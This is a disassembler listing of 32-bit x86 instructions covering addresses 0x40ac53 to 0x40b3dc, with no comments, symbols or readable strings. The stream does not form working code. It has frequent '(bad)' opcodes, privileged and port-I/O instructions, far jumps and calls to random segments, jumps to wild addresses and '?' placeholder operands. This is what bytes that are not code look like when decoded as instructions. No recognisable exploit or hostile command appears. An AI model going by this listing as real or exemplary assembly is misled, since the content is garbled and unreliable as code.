  40ac53:	push   0x1c5512a5
  40ac58:	or     DWORD PTR [edi+0x27],esp
  40ac5b:	arpl   si,bp
  40ac5d:	mov    esi,0xa93dc6e3
  40ac62:	test   DWORD PTR [ebx+0x7ec79ee5],0x64331e98
  40ac6c:	pushf  
  40ac6d:	scas   al,BYTE PTR es:[edi]
  40ac6e:	lock push es
  40ac70:	and    bh,BYTE PTR [edi]
  40ac72:	scas   eax,DWORD PTR es:[edi]
  40ac73:	dec    ecx
  40ac74:	mov    dh,BYTE PTR [ecx-0x31]
  40ac77:	jmp    0x54ed7af9
  40ac7c:	adc    edi,ebx
  40ac7e:	mov    ds,WORD PTR [ebp+eiz*1+0x6a578f43]
  40ac85:	lahf   
  40ac86:	ds rcr ah,1
  40ac89:	sub    BYTE PTR [ecx+0x43],al
  40ac8c:	and    eax,0x88b7deeb
  40ac91:	rcl    DWORD PTR gs:[edi-0x2c9c953c],0x54
  40ac99:	add    BYTE PTR [ebx],bh
  40ac9b:	je     0x40ac79
  40ac9d:	scas   al,BYTE PTR es:[edi]
  40ac9e:	jmp    0x4dc5:0xe24406ef
  40aca5:	or     BYTE PTR [esi+0x76],ch
  40aca8:	into   
  40aca9:	jmp    0x40ac83
  40acab:	or     eax,0x76b2887e
  40acb0:	test   eax,0x9ed7384d
  40acb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acb6:	imul   DWORD PTR [ebp-0x663ed458]
  40acbc:	neg    DWORD PTR [edx+0x121c6a9a]
  40acc2:	ror    edx,cl
  40acc4:	sub    BYTE PTR [eax-0x2e779c2b],bh
  40acca:	aas    
  40accb:	out    dx,eax
  40accc:	jmp    0x814539d7
  40acd1:	les    ebx,FWORD PTR [edx+eax*8-0x123416c2]
  40acd8:	(bad)  
  40acd9:	adc    edi,DWORD PTR [edx-0x26]
  40acdc:	imul   esi,DWORD PTR [edx],0xa542377e
  40ace2:	popf   
  40ace3:	cmp    DWORD PTR [eax],0xed54af50
  40ace9:	into   
  40acea:	gs pop eax
  40acec:	(bad)  
  40aced:	daa    
  40acee:	or     eax,0x27a45eff
  40acf3:	loopne 0x40ad1d
  40acf5:	mov    WORD PTR [ebx+0x14],?
  40acf8:	je     0x40ace3
  40acfa:	mov    WORD PTR [ebx+0x367b8a88],cs
  40ad00:	shl    ebp,0x1a
  40ad03:	fs or  al,0x38
  40ad06:	jno    0x40ad44
  40ad08:	cmp    DWORD PTR [ebx+0x30e48896],edx
  40ad0e:	out    dx,al
  40ad0f:	dec    eax
  40ad10:	jl     0x40acdc
  40ad12:	ja     0x40acb3
  40ad14:	mov    eax,0x11c1278
  40ad19:	xchg   ecx,eax
  40ad1a:	push   ecx
  40ad1b:	aas    
  40ad1c:	push   cs
  40ad1d:	jmp    0x99a98dd
  40ad22:	cmp    DWORD PTR [ecx+0x45],0xfffffff8
  40ad26:	pop    es
  40ad27:	test   BYTE PTR [esi-0x4d],dh
  40ad2a:	dec    edi
  40ad2b:	mov    dl,BYTE PTR [ebx-0x4f85e9c]
  40ad31:	ins    DWORD PTR es:[edi],dx
  40ad32:	std    
  40ad33:	fild   DWORD PTR [ebp+0x4c]
  40ad36:	push   ecx
  40ad37:	xor    eax,0xa12ab964
  40ad3c:	neg    DWORD PTR [esi+0x4fdf97d0]
  40ad42:	push   ss
  40ad43:	imul   edx,ecx,0xffffffcf
  40ad46:	mov    DWORD PTR [edx+esi*2+0x3ae41123],ebx
  40ad4d:	loopne 0x40ad9f
  40ad4f:	push   cs
  40ad50:	ins    BYTE PTR es:[edi],dx
  40ad51:	lods   al,BYTE PTR ds:[esi]
  40ad52:	fldcw  WORD PTR [ebp-0x21c9bfc7]
  40ad58:	add    edx,edi
  40ad5a:	cwde   
  40ad5b:	push   0x78
  40ad5d:	fbstp  TBYTE PTR [esi+ebp*2]
  40ad60:	push   ebx
  40ad61:	das    
  40ad62:	ss xchg esi,eax
  40ad64:	sti    
  40ad65:	jg     0x40acfe
  40ad67:	add    cl,bh
  40ad69:	or     BYTE PTR ds:0xdc11ccd0,0x16
  40ad70:	rol    ch,0x36
  40ad73:	je     0x40adb6
  40ad75:	pop    ebp
  40ad76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad77:	ror    BYTE PTR [eax+0x242622f8],1
  40ad7d:	jmp    0x40ade4
  40ad7f:	mov    DWORD PTR [ebx-0x44],esi
  40ad82:	sub    cl,bl
  40ad84:	mov    esi,0x49072769
  40ad89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad8a:	xlat   BYTE PTR ds:[ebx]
  40ad8b:	mov    ah,0xe0
  40ad8d:	adc    DWORD PTR ds:0x48015f81,esp
  40ad93:	(bad)  [edi+0x1fe439c9]
  40ad99:	push   ss
  40ad9a:	inc    ebp
  40ad9b:	ret    0xa9c4
  40ad9e:	data16 (bad) 
  40ada0:	cmp    bl,BYTE PTR [ebp+0x7fb4e0e1]
  40ada6:	xlat   BYTE PTR ds:[ebx]
  40ada7:	xchg   ecx,eax
  40ada8:	cs enter 0x6cee,0xb0
  40adad:	(bad)  
  40adae:	fnstsw WORD PTR [esi-0x498cd311]
  40adb4:	push   ebx
  40adb5:	(bad)  
  40adb7:	push   esp
  40adb8:	aaa    
  40adb9:	leave  
  40adba:	in     eax,0x3c
  40adbc:	aam    0x2f
  40adbe:	inc    ecx
  40adbf:	add    ebx,DWORD PTR [esi-0x1]
  40adc2:	out    dx,eax
  40adc3:	cmp    DWORD PTR [esi-0x46],ebx
  40adc6:	adc    BYTE PTR [esp+ecx*4],ah
  40adc9:	daa    
  40adca:	jle    0x40ade0
  40adcc:	mov    ds:0x763b83f,al
  40add1:	call   0x40bb:0xf08bd16d
  40add8:	in     eax,dx
  40add9:	adc    cl,ch
  40addb:	mov    esi,0x371edfa7
  40ade0:	aam    0xd
  40ade2:	mov    dh,0x36
  40ade4:	push   es
  40ade5:	jne    0x40ae4c
  40ade7:	mov    edx,0x510792f8
  40adec:	jecxz  0x40ae47
  40adee:	popa   
  40adef:	scas   eax,DWORD PTR es:[edi]
  40adf0:	int3   
  40adf1:	sub    ebp,DWORD PTR [eax+ebp*8]
  40adf4:	mov    ebp,0x8e76635f
  40adf9:	and    al,0x35
  40adfb:	pop    ecx
  40adfc:	adc    eax,0x78bbfcb7
  40ae01:	jno    0x40adb4
  40ae03:	leave  
  40ae04:	or     BYTE PTR [esi+0x58574334],bh
  40ae0a:	mov    ah,0x46
  40ae0c:	push   ss
  40ae0d:	cmp    ch,BYTE PTR [ebp+0x44]
  40ae10:	rdmsr  
  40ae12:	pusha  
  40ae13:	jno    0x40ae2d
  40ae15:	inc    edx
  40ae16:	popf   
  40ae17:	addr16 sahf 
  40ae19:	xchg   edi,eax
  40ae1a:	out    dx,al
  40ae1b:	xor    eax,0x3a1ac285
  40ae20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae22:	sub    al,0x1d
  40ae24:	pop    ecx
  40ae25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae26:	(bad)  
  40ae27:	adc    BYTE PTR [edx+eax*2-0x5a],al
  40ae2b:	pop    ds
  40ae2c:	fsub   QWORD PTR [ebp+0x1a]
  40ae2f:	pcmpgtw mm0,QWORD PTR [edx-0x1f]
  40ae33:	mov    ch,0x4
  40ae35:	push   0x681f95d4
  40ae3a:	arpl   WORD PTR [ebx],dx
  40ae3c:	imul   esp,DWORD PTR [ebx],0x5433041f
  40ae42:	rcr    BYTE PTR [edx+ebx*2+0x56dda812],1
  40ae49:	or     esp,esp
  40ae4b:	jecxz  0x40ae45
  40ae4d:	mov    BYTE PTR [esi],cl
  40ae4f:	jecxz  0x40ae6a
  40ae51:	pop    esp
  40ae52:	push   cs
  40ae53:	sar    BYTE PTR [edx+0x21],1
  40ae56:	dec    esp
  40ae57:	dec    esp
  40ae58:	mov    esp,0x3586f623
  40ae5d:	rcl    DWORD PTR [ebx+0x4c],cl
  40ae60:	lds    eax,FWORD PTR [edx]
  40ae62:	imul   edx,esi,0x41c2ff7a
  40ae68:	enter  0x74db,0xb
  40ae6c:	mov    esi,0x69773b26
  40ae71:	call   0xfb29:0xae1da078
  40ae78:	add    esi,DWORD PTR [esp+esi*4]
  40ae7b:	daa    
  40ae7c:	mov    ebp,0x636f8a33
  40ae81:	jmp    0x7d6a06df
  40ae86:	xchg   ebx,eax
  40ae87:	dec    ebx
  40ae88:	rol    al,1
  40ae8a:	jmp    0xaca6:0x45dc09ee
  40ae91:	ret    0x98af
  40ae94:	cld    
  40ae95:	sbb    al,0xa6
  40ae97:	push   ebx
  40ae98:	rcr    BYTE PTR [esp+ebp*2-0x3d8000ee],0xfe
  40aea0:	loope  0x40af06
  40aea2:	fsub   QWORD PTR [ecx-0x21]
  40aea5:	or     ebp,DWORD PTR [esi+0x2b]
  40aea8:	ror    DWORD PTR [ebx],1
  40aeaa:	add    DWORD PTR [edx-0x4],0xe6f23f69
  40aeb1:	adc    ah,dl
  40aeb3:	mov    ds:0x11b95889,eax
  40aeb8:	in     al,0xdb
  40aeba:	xor    edi,ebx
  40aebc:	out    0xf6,al
  40aebe:	test   eax,0xfc8c5e29
  40aec3:	out    0x39,eax
  40aec5:	pushf  
  40aec6:	inc    eax
  40aec7:	add    DWORD PTR [eax+0x4e],0x18fcac77
  40aece:	retf   
  40aecf:	mov    eax,0x33926e07
  40aed4:	mov    ?,WORD PTR [esi+0x13]
  40aed7:	sar    BYTE PTR [ecx],0x35
  40aeda:	std    
  40aedb:	sbb    ch,ah
  40aedd:	add    DWORD PTR [esi+0x689b9c70],edi
  40aee3:	fsubr  QWORD PTR [ecx+0x5d]
  40aee6:	dec    ebp
  40aee7:	not    DWORD PTR [ebp+0x5d]
  40aeea:	dec    eax
  40aeeb:	pop    esp
  40aeec:	ror    BYTE PTR [ebx-0x5c493027],0x30
  40aef3:	inc    ebx
  40aef4:	lods   eax,DWORD PTR ds:[esi]
  40aef5:	or     al,0x10
  40aef7:	jmp    0x40aebc
  40aef9:	leave  
  40aefa:	xor    al,0x55
  40aefc:	mov    dl,BYTE PTR [esp+edi*2-0x51629538]
  40af03:	stos   DWORD PTR es:[edi],eax
  40af04:	pushf  
  40af05:	lods   eax,DWORD PTR ds:[esi]
  40af06:	addr16 pop ebp
  40af08:	bound  edi,QWORD PTR [ebx-0x6e46a8de]
  40af0e:	mov    esp,0x5a24d4fc
  40af13:	dec    ebx
  40af14:	push   edi
  40af15:	mov    edx,0xdc84ddf4
  40af1a:	dec    ebx
  40af1b:	xchg   ebx,eax
  40af1c:	push   ds
  40af1d:	sub    al,0x6
  40af1f:	dec    ebx
  40af20:	idiv   DWORD PTR [eax-0x45485b70]
  40af26:	mov    DWORD PTR [ecx-0x74],eax
  40af29:	sar    ah,cl
  40af2b:	ja     0x40afa5
  40af2d:	jns    0x40af1a
  40af2f:	je     0x40af51
  40af31:	add    bh,dl
  40af33:	dec    ebp
  40af34:	sbb    al,0x91
  40af36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af37:	packsswb mm5,mm3
  40af3a:	add    al,BYTE PTR [eax]
  40af3c:	in     al,0x81
  40af3e:	mov    eax,0x5a7db0e8
  40af43:	xchg   DWORD PTR [ecx+0x7ac3cdbe],edx
  40af49:	xchg   esi,eax
  40af4a:	scas   al,BYTE PTR es:[edi]
  40af4b:	lods   eax,DWORD PTR ds:[esi]
  40af4c:	adc    DWORD PTR [edi-0x35628a14],ecx
  40af52:	inc    ecx
  40af53:	cmp    BYTE PTR gs:[ebp+ebx*2-0x6c],ah
  40af58:	pop    eax
  40af59:	mov    edi,0xab4dbfbe
  40af5e:	cs xor al,0x8
  40af61:	nop
  40af62:	pop    esi
  40af63:	xor    edx,DWORD PTR [ebp+0x2191c286]
  40af69:	sahf   
  40af6a:	pop    esi
  40af6b:	lods   eax,DWORD PTR ds:[esi]
  40af6c:	test   eax,0xfe693717
  40af71:	aas    
  40af72:	or     esi,DWORD PTR [edx]
  40af74:	and    BYTE PTR [ebx],ch
  40af76:	mov    edi,0x1136c60
  40af7b:	mov    dh,0x34
  40af7d:	(bad)  
  40af7f:	mov    ecx,0x87bfc015
  40af84:	jnp    0x40afd4
  40af86:	loopne 0x40afb1
  40af88:	lahf   
  40af89:	hlt    
  40af8a:	xor    al,0xca
  40af8c:	mov    bl,0x38
  40af8e:	rol    BYTE PTR [esp+eiz*2],cl
  40af91:	jp     0x40b001
  40af93:	mul    BYTE PTR [eax+edi*2+0x6441adf4]
  40af9a:	or     al,BYTE PTR [edi-0x7d]
  40af9d:	repz jge 0x40af5c
  40afa0:	mov    BYTE PTR [ecx],bl
  40afa2:	or     al,BYTE PTR [ebx-0xba6a0d6]
  40afa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa9:	cmc    
  40afaa:	inc    ebp
  40afab:	nop
  40afac:	ja     0x40b01d
  40afae:	enter  0x6998,0x93
  40afb2:	xor    ecx,0xffffffcf
  40afb5:	add    DWORD PTR [ecx-0x34],0xffffffa2
  40afb9:	lods   eax,DWORD PTR ds:[esi]
  40afba:	lds    eax,FWORD PTR [edx]
  40afbc:	push   ds
  40afbd:	xor    DWORD PTR [esp+edi*4],ebx
  40afc0:	popa   
  40afc1:	aad    0x7d
  40afc3:	sub    eax,0x1a158181
  40afc8:	sbb    bl,bh
  40afca:	rcl    BYTE PTR [edx],cl
  40afcc:	aaa    
  40afcd:	jns    0x40af9a
  40afcf:	fnstcw WORD PTR [esi]
  40afd1:	test   al,0x2
  40afd3:	or     eax,DWORD PTR [edi]
  40afd5:	mov    ebp,0xbba60083
  40afda:	xchg   esp,eax
  40afdb:	sbb    al,BYTE PTR [ebx-0x7]
  40afde:	and    bh,ah
  40afe0:	xchg   edi,eax
  40afe1:	sub    dh,BYTE PTR [esi-0x72ad0a71]
  40afe7:	out    dx,eax
  40afe8:	out    0x72,eax
  40afea:	mov    eax,0x72484380
  40afef:	rcl    eax,1
  40aff1:	popf   
  40aff2:	mov    eax,0x33c41860
  40aff7:	sahf   
  40aff8:	dec    ebx
  40aff9:	push   ebp
  40affa:	stc    
  40affb:	outs   dx,DWORD PTR ds:[esi]
  40affc:	(bad)  
  40affd:	jmp    0x40b050
  40afff:	shl    DWORD PTR [esi],0xb7
  40b002:	cmp    ecx,ebx
  40b004:	in     eax,0x5c
  40b006:	outs   dx,BYTE PTR ds:[esi]
  40b007:	pushf  
  40b008:	mov    WORD PTR [ecx+0xf],ds
  40b00b:	jmp    0xd1ff:0x95eb2362
  40b012:	test   al,0x5
  40b014:	dec    esi
  40b015:	mov    dh,0x36
  40b017:	dec    esi
  40b018:	pop    ebx
  40b019:	int3   
  40b01a:	sbb    eax,0x7ce170ce
  40b01f:	sub    ebx,0xffffff8c
  40b022:	mov    al,ds:0xfb2dbdc7
  40b027:	mov    dh,0x14
  40b029:	ja     0x40afba
  40b02b:	mov    ebx,DWORD PTR [esi+ebx*2-0x8]
  40b02f:	inc    esi
  40b030:	push   cs
  40b031:	scas   eax,DWORD PTR es:[edi]
  40b032:	mov    eax,ds:0x4b152a69
  40b037:	dec    edi
  40b038:	and    ah,BYTE PTR [eax-0x4abbcd37]
  40b03e:	and    eax,DWORD PTR [ebp-0x4fa6cf]
  40b044:	push   ecx
  40b045:	fcmovnu st,st(5)
  40b047:	jb     0x40b0ac
  40b049:	xor    DWORD PTR [ebp+0x45c3f780],ebx
  40b04f:	sub    ah,BYTE PTR [ebp+0x64edcd64]
  40b055:	or     DWORD PTR [eax],eax
  40b057:	cli    
  40b058:	push   ss
  40b059:	outs   dx,BYTE PTR ds:[esi]
  40b05a:	stc    
  40b05b:	call   0xb6283deb
  40b060:	xor    dh,al
  40b062:	or     DWORD PTR [esi],ebp
  40b064:	stos   DWORD PTR es:[edi],eax
  40b065:	add    esi,ebx
  40b067:	xchg   ebx,eax
  40b068:	sti    
  40b069:	je     0x40b084
  40b06b:	add    DWORD PTR [eax+0x1a],edi
  40b06e:	sahf   
  40b06f:	(bad)  
  40b070:	push   ss
  40b071:	push   cs
  40b072:	mov    dh,0x30
  40b074:	lahf   
  40b075:	pop    esp
  40b076:	ret    0x2e48
  40b079:	or     bh,BYTE PTR [edx+edx*1+0x1b9ad78b]
  40b080:	sahf   
  40b081:	or     DWORD PTR [edx+edx*4],ebp
  40b084:	and    BYTE PTR [edi-0x49],cl
  40b087:	sbb    ah,BYTE PTR [esi-0x5cba5927]
  40b08d:	or     BYTE PTR [ecx-0x2b653782],cl
  40b093:	xlat   BYTE PTR ds:[ebx]
  40b094:	dec    edx
  40b095:	lea    esi,[edi]
  40b097:	and    eax,0xf08df46e
  40b09c:	fs xchg ecx,eax
  40b09e:	or     BYTE PTR [edi],0xa3
  40b0a1:	mov    dl,BYTE PTR [eax+edx*8+0x69]
  40b0a5:	rol    DWORD PTR [eax+0x30],1
  40b0a8:	cmp    BYTE PTR [esi+0x35],0x84
  40b0ac:	int3   
  40b0ad:	lods   al,BYTE PTR ds:[esi]
  40b0ae:	or     al,BYTE PTR [edx-0x7f]
  40b0b1:	(bad)  
  40b0b2:	fdivr  DWORD PTR [esp+edi*8]
  40b0b5:	enter  0x985,0x83
  40b0b9:	jmp    0x7318:0x79a7492c
  40b0c0:	xor    cl,cl
  40b0c2:	xchg   dh,dh
  40b0c4:	out    dx,eax
  40b0c5:	ja     0x40b0d2
  40b0c7:	fld    QWORD PTR ds:0xf0207163
  40b0ce:	ficom  DWORD PTR [eax]
  40b0d0:	pop    es
  40b0d1:	rdmsr  
  40b0d3:	lea    edi,ds:0xb3c8ca88
  40b0d9:	sub    edx,DWORD PTR [ebx+0x42]
  40b0dc:	dec    esp
  40b0dd:	ret    0x1b
  40b0e0:	pop    ds
  40b0e1:	shl    DWORD PTR [ecx],0x9a
  40b0e4:	ret    0xb52a
  40b0e7:	dec    edx
  40b0e8:	mov    ebp,gs
  40b0ea:	jnp    0x40b164
  40b0ec:	and    eax,0xc5eb8ca
  40b0f1:	hlt    
  40b0f2:	dec    esi
  40b0f3:	out    dx,eax
  40b0f4:	mov    ds:0x13ca42b2,eax
  40b0f9:	inc    ebp
  40b0fa:	pop    ss
  40b0fb:	mov    al,0x71
  40b0fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0fe:	xor    ebx,DWORD PTR [ebx]
  40b100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b101:	mov    bh,0xf7
  40b103:	test   DWORD PTR [esi+eiz*4-0x8a48351],0xf8e4d98d
  40b10e:	mov    ds:0x49736807,al
  40b113:	iret   
  40b114:	xor    eax,0x5779f000
  40b119:	mov    WORD PTR [ebx+0x36],?
  40b11c:	dec    esp
  40b11d:	out    0xb0,eax
  40b11f:	sbb    al,0xe4
  40b121:	add    al,0x41
  40b123:	jbe    0x40b0b5
  40b125:	sbb    ah,BYTE PTR [ebx+eax*4]
  40b128:	leave  
  40b129:	dec    ebp
  40b12a:	push   edi
  40b12b:	mov    edi,0x1a9ef48f
  40b130:	pop    edx
  40b131:	ds inc esp
  40b133:	pop    eax
  40b134:	js     0x40b17b
  40b136:	js     0x40b15b
  40b138:	dec    esp
  40b139:	or     ebx,DWORD PTR [esi+ebx*2+0x379df17e]
  40b140:	das    
  40b141:	sbb    ecx,DWORD PTR [ebx+eax*1-0x69]
  40b145:	aaa    
  40b146:	dec    eax
  40b147:	bound  eax,QWORD PTR [esi+0x13]
  40b14a:	leave  
  40b14b:	cli    
  40b14c:	jge    0x40b0d8
  40b14e:	data16 into 
  40b150:	pop    es
  40b151:	inc    esi
  40b152:	xor    ebp,edi
  40b154:	mov    bl,0xa0
  40b156:	mov    ebx,0x6958f6e
  40b15b:	jmp    0x40b0e5
  40b15d:	int3   
  40b15e:	pop    esp
  40b15f:	mov    esi,0xa97e273f
  40b164:	push   esi
  40b165:	lds    ebx,FWORD PTR ds:0x27ac3d3b
  40b16b:	(bad)  
  40b16c:	mov    al,0xab
  40b16e:	xor    DWORD PTR [esi-0x51],edi
  40b171:	aam    0xf4
  40b173:	daa    
  40b174:	out    dx,eax
  40b175:	add    DWORD PTR [ebp+0x2cce17bf],ecx
  40b17b:	sub    eax,0xd04853a3
  40b180:	leave  
  40b181:	push   cs
  40b182:	ins    BYTE PTR es:[edi],dx
  40b183:	push   eax
  40b184:	sbb    DWORD PTR [ecx+0x7238889c],edi
  40b18a:	pusha  
  40b18b:	jp     0x40b120
  40b18d:	lock pop ss
  40b18f:	pop    ss
  40b190:	dec    esp
  40b191:	enter  0xbc57,0x64
  40b195:	mov    esp,tr2
  40b198:	inc    edi
  40b199:	sub    eax,0x3ac38a2b
  40b19e:	cmp    al,0x67
  40b1a0:	sbb    BYTE PTR [ecx-0x5d0905a3],al
  40b1a6:	popa   
  40b1a7:	sub    DWORD PTR fs:[ebp+esi*2+0x10],0xa23f023
  40b1b0:	add    eax,0xfcf9f8db
  40b1b5:	hlt    
  40b1b6:	mov    al,fs:0xf9f249d7
  40b1bc:	sub    dh,ah
  40b1be:	sub    bl,BYTE PTR [esi-0x2f7ddd4]
  40b1c4:	push   ecx
  40b1c5:	and    ebp,DWORD PTR [edx+0x5c]
  40b1c8:	lock pop esi
  40b1ca:	std    
  40b1cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1cc:	in     al,dx
  40b1cd:	add    al,BYTE PTR [esi+0x4b]
  40b1d0:	(bad)  
  40b1d1:	sbb    dl,ch
  40b1d3:	shr    BYTE PTR [edx-0x7a],1
  40b1d6:	push   esp
  40b1d7:	cwde   
  40b1d8:	aam    0x23
  40b1da:	repz lahf 
  40b1dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1dd:	jmp    0xd8b5a56d
  40b1e2:	inc    eax
  40b1e3:	cmp    al,0x8a
  40b1e5:	(bad)  
  40b1e6:	fild   QWORD PTR [ebp+0x6b]
  40b1e9:	add    ah,BYTE PTR ds:0x50f13cb6
  40b1ef:	jae    0x40b20d
  40b1f1:	cmp    eax,0xbe8c6167
  40b1f6:	mov    BYTE PTR [edx],cl
  40b1f8:	ja     0x40b19c
  40b1fa:	das    
  40b1fb:	add    BYTE PTR [ebx+0x1386a05c],cl
  40b201:	jo     0x40b230
  40b203:	aaa    
  40b204:	mov    dh,0x52
  40b206:	inc    ecx
  40b207:	gs test al,0x4b
  40b20a:	and    al,0x7
  40b20c:	pop    ss
  40b20d:	adc    ecx,DWORD PTR [edi+eiz*4]
  40b210:	fwait
  40b211:	cmp    ah,bl
  40b213:	iret   
  40b214:	or     BYTE PTR [eax+0x2db052b5],cl
  40b21a:	and    BYTE PTR [ecx+0x24],dh
  40b21d:	idiv   ch
  40b21f:	dec    ebp
  40b220:	pop    edx
  40b221:	aad    0x53
  40b223:	pop    eax
  40b224:	(bad)  
  40b225:	mov    esi,0x5003abe
  40b22a:	mov    al,ds:0x326030d
  40b22f:	rol    BYTE PTR [edi+ecx*8],1
  40b232:	pusha  
  40b233:	xchg   ebp,eax
  40b234:	lds    eax,FWORD PTR [eax]
  40b236:	xor    ecx,0xc6984201
  40b23c:	test   BYTE PTR [ebx],cl
  40b23e:	scas   al,BYTE PTR es:[edi]
  40b23f:	in     al,dx
  40b240:	mov    ecx,0x31851da7
  40b245:	mul    BYTE PTR [ecx]
  40b247:	leave  
  40b248:	jmp    0x6a1d7ccf
  40b24d:	shr    BYTE PTR [esi+ecx*2+0x4f],1
  40b251:	dec    edi
  40b252:	out    dx,eax
  40b253:	dec    ebp
  40b254:	repnz leave 
  40b256:	adc    DWORD PTR [edx],esp
  40b258:	lock es scas al,BYTE PTR es:[edi]
  40b25b:	(bad)  
  40b25c:	pushf  
  40b25d:	and    eax,0x637ee124
  40b262:	rcr    BYTE PTR ds:[esi+0x42],cl
  40b266:	and    bh,dh
  40b268:	shl    BYTE PTR [eax],1
  40b26a:	jb     0x40b25d
  40b26c:	xchg   DWORD PTR [eax-0x64],eax
  40b26f:	je     0x40b24a
  40b271:	jg     0x40b27a
  40b273:	sub    dh,bl
  40b275:	add    eax,0xfec3acd
  40b27a:	cli    
  40b27b:	sub    ebp,DWORD PTR [ecx-0x10caa2f9]
  40b281:	push   ebp
  40b282:	dec    edx
  40b283:	fwait
  40b284:	cwde   
  40b285:	shr    BYTE PTR [edi-0x51],cl
  40b288:	sar    DWORD PTR [esi-0x4a860a08],0xe3
  40b28f:	das    
  40b290:	xlat   BYTE PTR ds:[ebx]
  40b291:	add    al,0x60
  40b294:	inc    edx
  40b295:	ret    0x5fc6
  40b298:	mov    ch,0x59
  40b29a:	push   eax
  40b29b:	repnz sub eax,0xaf189b23
  40b2a1:	mov    esp,DWORD PTR [ecx]
  40b2a3:	das    
  40b2a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2a5:	stos   DWORD PTR es:[edi],eax
  40b2a6:	inc    edx
  40b2a7:	out    dx,al
  40b2a8:	pop    ds
  40b2a9:	fstp   DWORD PTR [edx]
  40b2ab:	enter  0xffaa,0xd3
  40b2af:	fadd   st,st(3)
  40b2b1:	shl    DWORD PTR ds:0xb5ab9b40,cl
  40b2b7:	lahf   
  40b2b8:	cdq    
  40b2b9:	les    ebp,FWORD PTR [esi]
  40b2bb:	push   0xcae69023
  40b2c0:	in     al,dx
  40b2c1:	and    eax,0x7d46368e
  40b2c6:	rol    DWORD PTR [edx-0x6c061d0a],0x1a
  40b2cd:	int3   
  40b2ce:	dec    edx
  40b2cf:	dec    edi
  40b2d0:	mov    ecx,0x6118a2ec
  40b2d5:	hlt    
  40b2d6:	ds leave 
  40b2d8:	enter  0xe5e2,0xb6
  40b2dc:	test   al,0x21
  40b2de:	cmp    eax,0x2781c2df
  40b2e3:	shr    BYTE PTR [edx],cl
  40b2e5:	ja     0x40b26e
  40b2e7:	nop
  40b2e8:	arpl   WORD PTR [ebx-0x15],bp
  40b2eb:	adc    BYTE PTR [esi],0x1b
  40b2ee:	inc    ecx
  40b2ef:	add    BYTE PTR ds:0x69cac94a,bl
  40b2f5:	(bad)  
  40b2f6:	aam    0x9d
  40b2f8:	and    esi,DWORD PTR [edx-0x48]
  40b2fb:	dec    esp
  40b2fc:	dec    edx
  40b2fd:	sar    ah,cl
  40b2ff:	pop    ebp
  40b300:	sub    eax,ebp
  40b302:	push   es
  40b303:	fdiv   st(5),st
  40b305:	aaa    
  40b306:	aam    0xd8
  40b308:	(bad)  
  40b30a:	nop
  40b30b:	dec    esp
  40b30c:	fwait
  40b30d:	xor    BYTE PTR [esi+0x4fcb0e7a],0xa9
  40b314:	cs das 
  40b316:	cmc    
  40b317:	jae    0x40b2c1
  40b319:	add    BYTE PTR ds:0x9c3447c3,dl
  40b31f:	mov    esp,0x17d393a7
  40b324:	jbe    0x40b369
  40b326:	call   0xa1e9:0xbb93c13c
  40b32d:	and    ebp,DWORD PTR [ecx]
  40b32f:	cmp    eax,0xa791c214
  40b334:	cld    
  40b335:	call   0x1e5c:0x92e90724
  40b33c:	cmp    eax,0x50a63c8e
  40b341:	jo     0x40b2ea
  40b343:	push   ebp
  40b344:	arpl   sp,cx
  40b346:	inc    edx
  40b347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b348:	inc    esi
  40b349:	dec    esi
  40b34a:	test   bl,al
  40b34c:	enter  0x2d68,0xe7
  40b350:	push   ebp
  40b351:	cmc    
  40b352:	adc    DWORD PTR [ebp+0x1c],0x6ad958ba
  40b359:	mov    bl,0x74
  40b35b:	add    al,0xa3
  40b35d:	addr16 retf 0xc7d6
  40b361:	fsubr  st(4),st
  40b363:	das    
  40b364:	scas   al,BYTE PTR es:[edi]
  40b365:	std    
  40b366:	adc    edx,DWORD PTR gs:[ebp+ebx*4+0x5d]
  40b36b:	imul   ebx,DWORD PTR [edx+0x2761ee15],0x47
  40b372:	adc    eax,0xaf861799
  40b377:	loope  0x40b3c0
  40b379:	cmp    al,0x25
  40b37b:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40b37d:	inc    ebp
  40b37e:	push   cs
  40b37f:	and    edi,edi
  40b381:	test   al,0x94
  40b383:	xchg   edi,eax
  40b384:	in     al,dx
  40b385:	and    cl,BYTE PTR [esp]
  40b388:	das    
  40b389:	leave  
  40b38a:	out    0xa1,eax
  40b38c:	ret    0xb436
  40b38f:	mov    dh,0xd8
  40b391:	cmp    al,0x37
  40b393:	dec    edi
  40b394:	push   esi
  40b395:	nop    DWORD PTR [ebx]
  40b398:	push   esi
  40b399:	pop    edi
  40b39a:	mov    bh,0x9f
  40b39c:	stos   BYTE PTR es:[edi],al
  40b39d:	cmp    DWORD PTR [ecx-0x6b],ecx
  40b3a0:	jle    0x40b40a
  40b3a2:	(bad)  
  40b3a3:	dec    esp
  40b3a4:	mov    edx,0x37b0261a
  40b3a9:	retf   
  40b3aa:	xchg   dl,dl
  40b3ac:	leave  
  40b3ad:	inc    ebp
  40b3ae:	inc    esi
  40b3af:	mov    ebp,0x858ecd60
  40b3b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3b5:	out    dx,eax
  40b3b6:	ret    
  40b3b7:	repz inc esi
  40b3b9:	retf   0xf18a
  40b3bc:	or     al,0x91
  40b3be:	test   al,0xeb
  40b3c0:	out    dx,al
  40b3c1:	cmp    al,0x20
  40b3c3:	sahf   
  40b3c4:	cld    
  40b3c5:	scas   al,BYTE PTR es:[edi]
  40b3c6:	push   ss
  40b3c7:	(bad)  
  40b3c8:	(bad)  
  40b3c9:	lea    edx,[edx-0x1ae30f2f]
  40b3cf:	lods   eax,DWORD PTR ds:[esi]
  40b3d0:	add    ecx,DWORD PTR [edx+0x6046f022]
  40b3d6:	test   BYTE PTR [ecx-0x11813c61],al
  40b3dc:	push   es
